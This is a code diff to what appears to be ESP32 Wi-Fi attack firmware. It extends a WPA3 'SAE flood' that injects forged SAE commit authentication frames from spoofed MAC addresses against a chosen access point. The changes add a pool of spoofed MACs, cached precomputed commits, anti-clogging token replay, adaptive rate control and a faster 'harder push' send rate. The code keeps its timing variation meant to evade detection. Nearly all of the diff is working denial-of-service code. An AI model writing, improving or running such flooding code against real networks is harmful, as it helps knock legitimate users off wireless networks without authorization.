@@ -4724,6 +4724,31 @@ static int sae_flood_packets_sent = 0;
 static uint8_t sae_target_bssid[6];
 static int sae_target_channel = 1;
 static int sae_injection_rate = 25;
+// Limit the number of unique spoofed MACs to reduce crypto context thrash
+#define SAE_MAC_POOL_SIZE 8
+#define SAE_PRECOMPUTE_LIMIT 8
+static uint8_t sae_mac_pool[SAE_MAC_POOL_SIZE][6];
+static bool sae_mac_pool_ready = false;
+// Number of frames to send per MAC before switching to the next one
+static int sae_frames_per_mac = 32;
+// Cached commit data per MAC
+// Element is 32-byte X coordinate for P-256 (SAE commit encoding)
+static uint8_t sae_commit_element_cache[SAE_MAC_POOL_SIZE][33];
+static uint8_t sae_commit_scalar_cache[SAE_MAC_POOL_SIZE][32];
+static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
+static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
+static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];
+static uint32_t sae_cache_hits = 0;
+static uint32_t sae_cache_misses = 0;
+static uint32_t sae_pwe_failures = 0;
+static uint32_t sae_token_rx = 0;
+static uint32_t sae_commit_tx_ok = 0;
+static uint32_t sae_commit_tx_err = 0;
+static uint32_t sae_status76_rx = 0;
+static uint32_t sae_status0_rx = 0;
+// Track which spoofed MAC the anti-clogging token belongs to
+static uint8_t sae_token_mac[6];
+static bool sae_token_mac_valid = false;
 
 // SAE protocol state and variables
 typedef struct {
@@ -4753,10 +4778,8 @@ static bool sae_initialized = false;
 static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
 
 // Forward declarations
-static void inject_sae_confirm_frame(void);
 static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
 static esp_err_t sae_generate_commit(sae_data_t *sae);
-static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, uint8_t *confirm);
 
 /**
  * Derive Password-to-Element (PWE) using hunt-and-peck method
@@ -4779,6 +4802,8 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
     mbedtls_mpi x, y, tmp;
     int counter = 1;
     bool found = false;
+    (void)ssid;
+    ESP_LOGI("SAE_PWE", "derive start");
     
     mbedtls_mpi_init(&x); mbedtls_mpi_init(&y); mbedtls_mpi_init(&tmp);
     mbedtls_sha256_init(&sae_sha256);
@@ -4795,12 +4820,6 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
             memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
         }
         
-        if (ssid) {
-            int ssid_len = strlen(ssid);
-            memcpy(sae_pwd_seed + pos, ssid, ssid_len);
-            pos += ssid_len;
-        }
-        
         int pwd_len = strlen(password);
         memcpy(sae_pwd_seed + pos, password, pwd_len);
         pos += pwd_len;
@@ -4815,28 +4834,36 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
         mbedtls_mpi_read_binary(&x, sae_pwd_value, 32);
         mbedtls_mpi_mod_mpi(&x, &x, &group->P);
         
-        // Check if x^3 + ax + b is quadratic residue
+        // Check if x^3 + a*x + b is quadratic residue and try both parities
         mbedtls_mpi_mul_mpi(&tmp, &x, &x);
         mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
         mbedtls_mpi_mul_mpi(&tmp, &tmp, &x);
         mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_mul_mpi(&y, &group->A, &x);
+        mbedtls_mpi_mod_mpi(&y, &y, &group->P);
+        mbedtls_mpi_add_mpi(&tmp, &tmp, &y);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
         mbedtls_mpi_add_mpi(&tmp, &tmp, &group->B);
         mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
         
-        // Try to construct point from x coordinate
         uint8_t point_buf[33];
-        point_buf[0] = 0x02;  // Compressed point format
         memcpy(point_buf + 1, sae_pwd_value, 32);
-        
+        point_buf[0] = 0x02;
+        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
+            found = true;
+        } else {
+            point_buf[0] = 0x03;
         if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
             found = true;
         } else {
             counter++;
+            }
         }
     }
     
     mbedtls_mpi_free(&x); mbedtls_mpi_free(&y); mbedtls_mpi_free(&tmp);
     mbedtls_sha256_free(&sae_sha256);
+    ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
     
     return found ? ESP_OK : ESP_FAIL;
 }
@@ -4845,12 +4872,16 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
  * Generate SAE commit scalar and element
  */
 static esp_err_t sae_generate_commit(sae_data_t *sae) {
+    ESP_LOGI("SAE_COMMIT", "gen start");
     // Initialize crypto contexts once
     if (!sae_crypto_initialized) {
         mbedtls_entropy_init(&sae_entropy);
         mbedtls_ctr_drbg_init(&sae_ctr_drbg);
         mbedtls_ecp_point_init(&sae_tmp_point);
-        mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+        if (mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0) != 0) {
+            ESP_LOGI("SAE_COMMIT", "drbg seed fail");
+            return ESP_FAIL;
+        }
         sae_crypto_initialized = true;
     }
     
@@ -4861,12 +4892,32 @@ static esp_err_t sae_generate_commit(sae_data_t *sae) {
     // scalar = (rand + mask) mod order
     mbedtls_mpi_add_mpi(&sae->own_scalar, &sae->rand, &sae->mask);
     mbedtls_mpi_mod_mpi(&sae->own_scalar, &sae->own_scalar, &sae->group.N);
-    
-    // Use muladd: R = m1*P1 + m2*P2 where R=own_element, m1=rand, P1=PWE, m2=mask, P2=G
-    mbedtls_ecp_muladd(&sae->group, &sae->own_element, 
-                       &sae->rand, &sae->pwe,
-                       &sae->mask, &sae->group.G);
-    
+    if (mbedtls_mpi_cmp_int(&sae->own_scalar, 0) == 0) {
+        mbedtls_mpi_lset(&sae->own_scalar, 1);
+    }
+    // own_element = (N - (mask mod N)) * PWE  [equivalent to -(mask * PWE) mod N]
+    {
+        mbedtls_mpi mask_mod, mask_neg;
+        mbedtls_mpi_init(&mask_mod);
+        mbedtls_mpi_init(&mask_neg);
+        mbedtls_mpi_mod_mpi(&mask_mod, &sae->mask, &sae->group.N);
+        if (mbedtls_mpi_cmp_int(&mask_mod, 0) == 0) {
+            mbedtls_mpi_lset(&mask_mod, 1);
+        }
+        mbedtls_mpi_sub_mpi(&mask_neg, &sae->group.N, &mask_mod);
+        if (mbedtls_mpi_cmp_int(&mask_neg, 0) == 0) {
+            mbedtls_mpi_lset(&mask_neg, 1);
+        }
+        if (mbedtls_ecp_mul(&sae->group, &sae->own_element, &mask_neg, &sae->pwe,
+                            mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) {
+            mbedtls_mpi_free(&mask_mod);
+            mbedtls_mpi_free(&mask_neg);
+            return ESP_FAIL;
+        }
+        mbedtls_mpi_free(&mask_mod);
+        mbedtls_mpi_free(&mask_neg);
+    }
+    ESP_LOGI("SAE_COMMIT", "gen ok");
     return ESP_OK;
 }
 
@@ -4891,10 +4942,12 @@ static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, u
     // Skip compression byte by shifting buffer
     uint8_t *kptr = k + 1;
 
-    // Confirm = SHA256(send_confirm || K)
+    // Confirm = SHA256(be16(send_confirm) || K)
     mbedtls_sha256_init(&sae_sha256);
     mbedtls_sha256_starts(&sae_sha256, 0);
-    mbedtls_sha256_update(&sae_sha256, (uint8_t*)&send_confirm, sizeof(send_confirm));
+    uint8_t sc_be[2] = { (uint8_t)(send_confirm & 0xFF), (uint8_t)((send_confirm >> 8) & 0xFF) };
+    uint8_t tmp_swap = sc_be[0]; sc_be[0] = sc_be[1]; sc_be[1] = tmp_swap;
+    mbedtls_sha256_update(&sae_sha256, sc_be, sizeof(sc_be));
     mbedtls_sha256_update(&sae_sha256, kptr, 32);
     mbedtls_sha256_finish(&sae_sha256, confirm);
     mbedtls_sha256_free(&sae_sha256);
@@ -4909,46 +4962,53 @@ cleanup:
  */
 static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac,
                                   const uint8_t *peer_mac, const char *ssid) {
-    if (sae_initialized) {
+    // Reuse if already initialized for the same MAC tuple
+    if (sae_initialized &&
+        memcmp(sae_ctx.own_mac, own_mac, 6) == 0 &&
+        memcmp(sae_ctx.peer_mac, peer_mac, 6) == 0) {
         return ESP_OK;
     }
-    
-    memset(&sae_ctx, 0, sizeof(sae_ctx));
+
+    if (!sae_initialized) {
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
+        }
+        sae_initialized = true;
+    }
+
     strncpy(sae_ctx.password, password, sizeof(sae_ctx.password) - 1);
     memcpy(sae_ctx.own_mac, own_mac, 6);
     memcpy(sae_ctx.peer_mac, peer_mac, 6);
     memcpy(sae_ctx.bssid, peer_mac, 6);
     
-    mbedtls_ecp_group_init(&sae_ctx.group);
-    mbedtls_ecp_point_init(&sae_ctx.pwe);
-    mbedtls_ecp_point_init(&sae_ctx.peer_element);
-    mbedtls_ecp_point_init(&sae_ctx.own_element);
-    mbedtls_mpi_init(&sae_ctx.peer_scalar);
-    mbedtls_mpi_init(&sae_ctx.own_scalar);
-    mbedtls_mpi_init(&sae_ctx.rand);
-    mbedtls_mpi_init(&sae_ctx.mask);
-    
-    if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
-        return ESP_FAIL;
-    }
-    
-    // Derive PWE
+    // Derive PWE with the provided MAC addresses
     if (sae_derive_pwe(password, own_mac, peer_mac, ssid, &sae_ctx.pwe, &sae_ctx.group) != ESP_OK) {
         return ESP_FAIL;
     }
     
-    sae_initialized = true;
     return ESP_OK;
 }
 
 // Static frame buffer to reduce stack usage
-static uint8_t sae_frame_buffer[128];
+static uint8_t sae_frame_buffer[512];
 
-static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
+static char sae_flood_password_buf[64];
+
+static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     int frame_len = 0;
     bool token_required_local = false;
     uint16_t token_len_local = 0;
-    uint8_t token_buf_local[32];
+    uint8_t token_buf_local[128];
     
     // 802.11 Authentication header
     sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;  // Frame Control
@@ -4957,9 +5017,10 @@ static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     memcpy(sae_frame_buffer + 4, sae_target_bssid, 6);
     memcpy(sae_frame_buffer + 10, src_mac, 6);
     memcpy(sae_frame_buffer + 16, sae_target_bssid, 6);
-    // Sequence Control with variation
-    uint16_t seq = (esp_random() & 0xFFF0) | (frame_counter & 0x000F);
-    sae_frame_buffer[22] = seq & 0xFF; sae_frame_buffer[23] = seq >> 8;
+    // Sequence Control: fragment number = 0, 12-bit seq number random
+    uint16_t seq = esp_random() & 0x0FFF;
+    sae_frame_buffer[22] = (seq << 4) & 0xF0;
+    sae_frame_buffer[23] = (seq >> 4) & 0xFF;
     frame_len = 24;
     
     // Auth Algorithm = SAE (3), Sequence = Commit (1), Status = 0
@@ -4970,83 +5031,149 @@ static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     // Group ID = P-256 (19)
     sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
     
-    // Add anti-clogging token if required (variable length)
+    // Read anti-clogging token if required (write it later after scalar+element)
     portENTER_CRITICAL(&sae_lock);
     token_required_local = sae_ctx.token_required;
     token_len_local = sae_ctx.token_len;
-    if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
     if (token_required_local && token_len_local > 0) {
+        if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
         memcpy(token_buf_local, sae_ctx.token, token_len_local);
     }
     portEXIT_CRITICAL(&sae_lock);
-    if (token_required_local && token_len_local > 0) {
-        memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
-        frame_len += token_len_local;
+    ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
+    
+    // Initialize base crypto once
+    static const char *sae_flood_password = NULL;
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = NULL;
+    if (!sae_crypto_initialized) {
+        mbedtls_entropy_init(&sae_entropy);
+        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+        mbedtls_ecp_point_init(&sae_tmp_point);
+        mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+        sae_crypto_initialized = true;
     }
-    
-    // Initialize SAE context if needed
-    const char *pwd = settings_get_sta_password(&G_Settings);
-    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
-    uint8_t own_mac[6];
-    esp_wifi_get_mac(WIFI_IF_STA, own_mac);
-    
     if (!sae_initialized) {
-        bool inited = false;
-        if (pwd && strlen(pwd) > 0) {
-            if (sae_init_context(pwd, own_mac, sae_target_bssid, ssid) == ESP_OK &&
-                sae_generate_commit(&sae_ctx) == ESP_OK) {
-                inited = true;
-            }
-        }
-        if (!inited) {
-            if (!sae_crypto_initialized) {
-                mbedtls_entropy_init(&sae_entropy);
-                mbedtls_ctr_drbg_init(&sae_ctr_drbg);
-                mbedtls_ecp_point_init(&sae_tmp_point);
-                mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
-                sae_crypto_initialized = true;
-            }
-            mbedtls_ecp_group_init(&sae_ctx.group);
-            mbedtls_ecp_point_init(&sae_ctx.own_element);
-            mbedtls_mpi_init(&sae_ctx.own_scalar);
-            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) return;
-            mbedtls_mpi_fill_random(&sae_ctx.own_scalar, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
-            mbedtls_mpi_mod_mpi(&sae_ctx.own_scalar, &sae_ctx.own_scalar, &sae_ctx.group.N);
-            if (mbedtls_mpi_cmp_int(&sae_ctx.own_scalar, 0) == 0) mbedtls_mpi_lset(&sae_ctx.own_scalar, 1);
-            if (mbedtls_ecp_mul(&sae_ctx.group, &sae_ctx.own_element, &sae_ctx.own_scalar,
-                                &sae_ctx.group.G, mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) return;
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
         }
         sae_initialized = true;
     }
-    
-    // Write Element as full 33-byte compressed point
-    size_t element_len = 0;
-    uint8_t element_comp[33];
-    if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
-                                       MBEDTLS_ECP_PF_COMPRESSED, &element_len,
-                                       element_comp, sizeof(element_comp)) != 0 || element_len < 33) {
-        return;
+
+    // Use cached commit for this MAC if available
+    int pool_idx = -1;
+    if (sae_mac_pool_ready) {
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            if (memcmp(sae_mac_pool[i], src_mac, 6) == 0) { pool_idx = i; break; }
+        }
     }
-    memcpy(sae_frame_buffer + frame_len, element_comp, element_len);
-    frame_len += element_len;
+    bool used_cache = false;
+    if (pool_idx >= 0 && pwd && strlen(pwd) > 0 && sae_commit_cache_ready[pool_idx]) {
+        portENTER_CRITICAL(&sae_lock);
+        memcpy(sae_ctx.own_mac, src_mac, 6);
+        memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+        memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+        mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
+        portEXIT_CRITICAL(&sae_lock);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, sae_commit_element_cache[pool_idx] + 1, 32);
+        frame_len += 32;
+        used_cache = true;
+        sae_cache_hits++;
+        ESP_LOGI("SAE_TX", "cache hit idx=%d", pool_idx);
+    } else {
+        // Fall back to on-demand derivation/generation when no cache; require password/PWE
+        if (!(pwd && strlen(pwd) > 0)) return ESP_FAIL;
+        if (sae_init_context(pwd, src_mac, sae_target_bssid, ssid) != ESP_OK ||
+            sae_generate_commit(&sae_ctx) != ESP_OK) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            mbedtls_ecp_point_free(&sae_ctx.pwe);
+            mbedtls_ecp_point_free(&sae_ctx.peer_element);
+            mbedtls_ecp_point_free(&sae_ctx.own_element);
+            mbedtls_mpi_free(&sae_ctx.peer_scalar);
+            mbedtls_mpi_free(&sae_ctx.own_scalar);
+            mbedtls_mpi_free(&sae_ctx.rand);
+            mbedtls_mpi_free(&sae_ctx.mask);
+            memset(&sae_ctx, 0, sizeof(sae_ctx));
+            sae_initialized = false;
+                return ESP_FAIL;
+            }
+        sae_cache_misses++;
+        ESP_LOGI("SAE_TX", "cache miss derive ok");
+    }
     
-    // Write Scalar (32 bytes)
-    mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
-    frame_len += 32;
+    if (!used_cache) {
+        // Element: 32-byte X coordinate of own_element
+        uint8_t element_x[32];
+        size_t elen = 0;
+        uint8_t element_buf[33];
+        if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                           MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                           element_buf, sizeof(element_buf)) != 0 || elen < 33) {
+            return ESP_FAIL;
+        }
+        memcpy(element_x, element_buf + 1, 32);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        // Scalar (32 bytes)
+        mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, element_x, 32);
+        frame_len += 32;
+    }
+    ESP_LOGI("SAE_TX", "frm len=%d", frame_len);
+
+    // Append anti-clogging token (after scalar + element)
+    if (token_required_local && token_len_local > 0) {
+        size_t remaining = sizeof(sae_frame_buffer) - frame_len;
+        if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
+        if (token_len_local > 0) {
+            memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
+            frame_len += token_len_local;
+        }
+    }
     
     // Transmit commit frame
+    // Maintain a per-MAC seq counter to keep auth seq control more stable
+    if (pool_idx >= 0) {
+        uint16_t s = ++sae_seq_counters[pool_idx] & 0x0FFF;
+        sae_frame_buffer[22] = (s << 4) & 0xF0;
+        sae_frame_buffer[23] = (s >> 4) & 0xFF;
+    }
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
     if (err == ESP_OK) {
         sae_flood_packets_sent++;
+        sae_commit_tx_ok++;
+        ESP_LOGI("SAE_TX", "tx ok");
     } else {
         ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
+        sae_commit_tx_err++;
     }
+    return err;
 }
 
 static void sae_flood_task(void *param) {
     uint8_t spoofed_mac[6];
     uint8_t base_mac[6];
     int frame_counter = 0;
+    int backoff_ms = 0;
+    int consecutive_no_mem = 0;
+    int rate_scale_pct = 100;
+    int success_streak = 0;
     
     // Get base MAC address
     esp_wifi_get_mac(WIFI_IF_STA, base_mac);
@@ -5058,25 +5185,66 @@ static void sae_flood_task(void *param) {
     printf("Rate: %d fps\n", sae_injection_rate);
     
     while (sae_flood_running) {
-        // Generate spoofed MAC address
-        memcpy(spoofed_mac, base_mac, 6);
-        spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
-        spoofed_mac[5] = frame_counter & 0xFF;
+        if ((frame_counter % 100) == 0) {
+            ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
+        }
+        // Select spoofed MAC, pin to token MAC if anti-clogging token is active
+        if (sae_token_mac_valid) {
+            memcpy(spoofed_mac, sae_token_mac, 6);
+        } else if (sae_mac_pool_ready) {
+            int pool_idx = (frame_counter / (sae_frames_per_mac > 0 ? sae_frames_per_mac : 1)) % SAE_MAC_POOL_SIZE;
+            memcpy(spoofed_mac, sae_mac_pool[pool_idx], 6);
+        } else {
+            // Fallback to legacy derivation if pool not ready
+            memcpy(spoofed_mac, base_mac, 6);
+            spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
+            spoofed_mac[5] = frame_counter & 0xFF;
+            // Ensure locally administered, unicast
+            spoofed_mac[0] |= 0x02;
+            spoofed_mac[0] &= 0xFE;
+        }
         
         // Inject SAE commit frame
-        inject_sae_commit_frame(spoofed_mac, frame_counter);
+        esp_err_t tx_res = inject_sae_commit_frame(spoofed_mac, frame_counter);
+        if (tx_res == ESP_ERR_NO_MEM) {
+            consecutive_no_mem++;
+            success_streak = 0;
+            backoff_ms = (backoff_ms == 0) ? 50 : (backoff_ms * 2);
+            if (backoff_ms > 1000) backoff_ms = 1000;
+            if (rate_scale_pct > 10) {
+                rate_scale_pct -= 20;
+                if (rate_scale_pct < 10) rate_scale_pct = 10;
+            }
+            ESP_LOGW("SAE_FLOOD", "ESP_ERR_NO_MEM, backing off %d ms (streak=%d)", backoff_ms, consecutive_no_mem);
+            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
+        } else if (tx_res != ESP_OK) {
+            // brief pause on other errors to avoid tight loop
+            vTaskDelay(pdMS_TO_TICKS(20));
+        } else {
+            if (backoff_ms > 0) backoff_ms /= 2;
+            if (consecutive_no_mem) consecutive_no_mem = 0;
+            if (++success_streak >= 10) {
+                success_streak = 0;
+                if (rate_scale_pct < 100) {
+                    rate_scale_pct += 10;
+                    if (rate_scale_pct > 100) rate_scale_pct = 100;
+                }
+            }
+        }
         
         frame_counter = (frame_counter + 1) % 65536;
         
-        // Rate limiting with variation to avoid detection
-        int variation = (esp_random() % 20) - 10; // +/- 10% variation
-        int actual_rate = sae_injection_rate + (sae_injection_rate * variation / 100);
-        if (actual_rate < 50) actual_rate = 50; // minimum rate
-        if (actual_rate > 200) actual_rate = 200; // reduced maximum rate
+        // Rate limiting with variation and adaptive scaling
+        int base_rate = (sae_injection_rate * rate_scale_pct) / 100;
+        int variation = (esp_random() % 20) - 10; // +/- 10%
+        int actual_rate = base_rate + (base_rate * variation / 100);
+        if (actual_rate < 1) actual_rate = 1;
+        if (actual_rate > 200) actual_rate = 200;
         
         // Ensure minimum delay to prevent watchdog timeout
         int delay_ms = 1000 / actual_rate;
-        if (delay_ms < 5) delay_ms = 5; // minimum 5ms delay
+    if (delay_ms < 2) delay_ms = 2; // harder push
+        if (backoff_ms > delay_ms) delay_ms = backoff_ms;
         vTaskDelay(pdMS_TO_TICKS(delay_ms));
         
         // Yield to other tasks every 10 frames
@@ -5099,7 +5267,12 @@ static void sae_flood_display_task(void *param) {
         last_count = sae_flood_packets_sent;
         
         // Use simpler output to reduce stack usage
-        printf("SAE: %d/sec | %d total\n", current_rate, sae_flood_packets_sent);
+        printf("SAE: %d/sec | %d total | hits:%u miss:%u pwefail:%u tok:%u txok:%u txerr:%u s76:%u s0:%u\n",
+               current_rate, sae_flood_packets_sent,
+               (unsigned)sae_cache_hits, (unsigned)sae_cache_misses,
+               (unsigned)sae_pwe_failures, (unsigned)sae_token_rx,
+               (unsigned)sae_commit_tx_ok, (unsigned)sae_commit_tx_err,
+               (unsigned)sae_status76_rx, (unsigned)sae_status0_rx);
         
         vTaskDelay(pdMS_TO_TICKS(5000));
     }
@@ -5108,7 +5281,23 @@ static void sae_flood_display_task(void *param) {
     vTaskDelete(NULL);
 }
 
-void wifi_manager_start_sae_flood(void) {
+static void sanitize_password_input(const char *in, char *out, size_t out_size) {
+    if (!out || out_size == 0) return;
+    if (!in) { out[0] = '\0'; return; }
+    while (*in && isspace((unsigned char)*in)) in++;
+    const char *end = in + strlen(in);
+    while (end > in && isspace((unsigned char)end[-1])) end--;
+    if (end > in + 1 && (in[0] == '"' || in[0] == '\'')) {
+        char q = in[0];
+        if (end[-1] == q) { in++; end--; }
+    }
+    size_t n = (size_t)(end - in);
+    if (n >= out_size) n = out_size - 1;
+    if (n > 0) memcpy(out, in, n);
+    out[n] = '\0';
+}
+
+void wifi_manager_start_sae_flood(const char *password) {
 #if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
     printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
@@ -5147,14 +5336,84 @@ void wifi_manager_start_sae_flood(void) {
 
     memcpy(sae_target_bssid, selected_ap.bssid, 6);
     sae_target_channel = selected_ap.primary;
-    sae_injection_rate = 100;
+    sae_injection_rate = 60;
     sae_flood_packets_sent = 0;
     sae_flood_running = true;
     sae_initialized = false;
+    sanitize_password_input(password, sae_flood_password_buf, sizeof(sae_flood_password_buf));
     portENTER_CRITICAL(&sae_lock);
     sae_ctx.token_required = false;
     sae_ctx.token_len = 0;
     portEXIT_CRITICAL(&sae_lock);
+
+    // Build a small pool of spoofed MACs to preserve randomness without exhausting heap
+    {
+        uint8_t base_mac_build[6];
+        esp_wifi_get_mac(WIFI_IF_STA, base_mac_build);
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            uint32_t r = esp_random();
+            memcpy(sae_mac_pool[i], base_mac_build, 6);
+            // locally administered, unicast
+            sae_mac_pool[i][0] |= 0x02;
+            sae_mac_pool[i][0] &= 0xFE;
+            sae_mac_pool[i][4] = (r >> 8) & 0xFF;
+            sae_mac_pool[i][5] = r & 0xFF;
+            sae_seq_counters[i] = (uint16_t)(esp_random() & 0x0FFF);
+            sae_precompute_attempted[i] = false;
+            sae_commit_cache_ready[i] = false;
+        }
+        sae_mac_pool_ready = true;
+    }
+
+    // Precompute commit (element + scalar) per MAC to avoid per-frame allocations
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+    if (pwd && strlen(pwd) > 0) {
+        if (!sae_crypto_initialized) {
+            mbedtls_entropy_init(&sae_entropy);
+            mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+            mbedtls_ecp_point_init(&sae_tmp_point);
+            mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+            sae_crypto_initialized = true;
+        }
+        if (!sae_initialized) {
+            mbedtls_ecp_group_init(&sae_ctx.group);
+            mbedtls_ecp_point_init(&sae_ctx.pwe);
+            mbedtls_ecp_point_init(&sae_ctx.own_element);
+            mbedtls_ecp_point_init(&sae_ctx.peer_element);
+            mbedtls_mpi_init(&sae_ctx.own_scalar);
+            mbedtls_mpi_init(&sae_ctx.peer_scalar);
+            mbedtls_mpi_init(&sae_ctx.rand);
+            mbedtls_mpi_init(&sae_ctx.mask);
+            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+                // Skip precompute on error
+            } else {
+                int precomputed = 0;
+                for (int i = 0; i < SAE_MAC_POOL_SIZE && precomputed < SAE_PRECOMPUTE_LIMIT; ++i) {
+                    if (sae_precompute_attempted[i]) continue;
+                    sae_precompute_attempted[i] = true;
+                if (sae_derive_pwe(pwd, sae_mac_pool[i], sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group) == ESP_OK) {
+                        if (sae_generate_commit(&sae_ctx) == ESP_OK) {
+                            uint8_t element_buf[33];
+                            size_t elen = 0;
+                            if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                                               MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                                               element_buf, sizeof(element_buf)) == 0 && elen == 33) {
+                                memcpy(sae_commit_element_cache[i], element_buf, 33);
+                                mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                                sae_commit_cache_ready[i] = true;
+                                precomputed++;
+                            }
+                        }
+                    } else {
+                        sae_pwe_failures++;
+                    }
